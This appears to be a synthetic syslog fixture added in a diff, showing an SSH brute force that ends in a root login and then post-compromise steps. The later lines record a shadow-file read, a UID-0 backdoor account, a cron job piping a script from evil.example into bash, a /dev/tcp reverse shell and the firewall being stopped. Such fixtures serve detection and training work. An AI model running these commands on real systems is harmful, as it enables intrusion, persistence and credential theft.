@@ -1,0 +1,14 @@
+Jan  7 03:14:01 web01 sshd[1201]: Failed password for invalid user admin from 203.0.113.55 port 51000 ssh2
+Jan  7 03:14:03 web01 sshd[1202]: Failed password for invalid user admin from 203.0.113.55 port 51002 ssh2
+Jan  7 03:14:05 web01 sshd[1203]: Failed password for root from 203.0.113.55 port 51004 ssh2
+Jan  7 03:14:07 web01 sshd[1204]: Failed password for root from 203.0.113.55 port 51006 ssh2
+Jan  7 03:14:09 web01 sshd[1205]: Failed password for invalid user oracle from 203.0.113.55 port 51008 ssh2
+Jan  7 03:14:11 web01 sshd[1206]: Failed password for invalid user postgres from 203.0.113.55 port 51010 ssh2
+Jan  7 03:14:13 web01 sshd[1207]: Failed password for invalid user git from 203.0.113.55 port 51012 ssh2
+Jan  7 03:14:20 web01 sshd[1210]: Accepted password for root from 203.0.113.55 port 51020 ssh2
+Jan  7 03:15:00 web01 sudo[1300]:   attacker : user NOT in sudoers ; TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan  7 03:15:30 web01 useradd[1400]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor, shell=/bin/bash
+Jan  7 03:16:05 web01 CRON[1600]: (root) CMD (curl http://evil.example/x.sh | bash)
+Jan  7 03:16:30 web01 sudo[1700]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.55/4444 0>&1
+Jan  7 03:17:00 web01 systemd[1]: Stopping ufw.service...
+Jan  7 03:17:01 web01 systemd[1]: Stopped ufw.service.
